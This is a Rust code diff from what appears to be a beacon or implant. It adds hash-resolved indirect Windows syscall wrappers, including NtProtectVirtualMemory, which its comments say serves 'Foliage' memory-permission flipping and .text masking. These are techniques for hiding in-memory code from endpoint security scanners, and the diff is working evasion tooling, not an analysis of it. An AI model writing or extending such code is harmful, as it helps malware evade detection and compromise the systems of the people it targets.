@@ -251,6 +251,29 @@ pub unsafe fn syscall4(
     Some(f(a1, a2, a3, a4))
 }
 
+/// 5-argument indirect syscall (e.g. `NtProtectVirtualMemory`). Same stub as
+/// [`syscall4`]/[`syscall6`]; the 5th arg rides the stack exactly as a native
+/// Win64 call would place it. The trampoline gets cast to a 5-arg fn pointer.
+///
+/// # Safety
+/// Same as [`syscall4`]; a5 must match the target syscall's 5th parameter
+/// (stack-passed per Win64 ABI).
+pub unsafe fn syscall5(
+    rt: &Runtime,
+    name_hash: u32,
+    a1: usize,
+    a2: usize,
+    a3: usize,
+    a4: usize,
+    a5: usize,
+) -> Option<i32> {
+    let ssn = rt.ssn_by_hash(name_hash)?;
+    let stub_addr = rt.trampoline_for(ssn);
+    type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
+    let f: Stub = core::mem::transmute(stub_addr);
+    Some(f(a1, a2, a3, a4, a5))
+}
+
 /// 6-argument indirect syscall. The indirect stub bytes are identical to the
 /// 4-arg case — Win64 passes args 5–6 on the stack and the stub neither reads
 /// nor clobbers the stack setup the caller did before `call`. The only
@@ -612,6 +635,32 @@ pub unsafe fn nt_query_attributes_file(
 /// `NtDelayExecution` — 2 real args (padded into the 4-arg shim).
 pub unsafe fn nt_delay_execution(rt: &Runtime, alertable: u8, delay: usize) -> Option<i32> {
     syscall4(rt, djb2(b"ntdelayexecution"), alertable as usize, delay, 0, 0)
+}
+
+/// `NtProtectVirtualMemory` — 5 real args: ProcessHandle, BaseAddress* (IN OUT),
+/// RegionSize* (IN OUT), NewAccessMask, OldAccessMask* (OUT). Used by Foliage
+/// (RX↔RW flip) + mem (.text mask). The current-process pseudo-handle
+/// (`0xFFFF_FFFF_FFFF_FFFF`) is passed for ProcessHandle.
+///
+/// # Safety
+/// `base`/`size`/`old_prot` must be valid mutable refs the syscall can write
+/// through; `new_prot` is a PAGE_* constant. Single-threaded beacon context.
+pub unsafe fn nt_protect_virtual_memory(
+    rt: &Runtime,
+    base: &mut usize,
+    size: &mut usize,
+    new_prot: u32,
+    old_prot: &mut u32,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntprotectvirtualmemory"),
+        0xFFFF_FFFF_FFFF_FFFF, // NtCurrentProcess pseudo-handle
+        base as *mut usize as usize,
+        size as *mut usize as usize,
+        new_prot as usize,
+        old_prot as *mut u32 as usize,
+    )
 }
 
 #[cfg(test)]
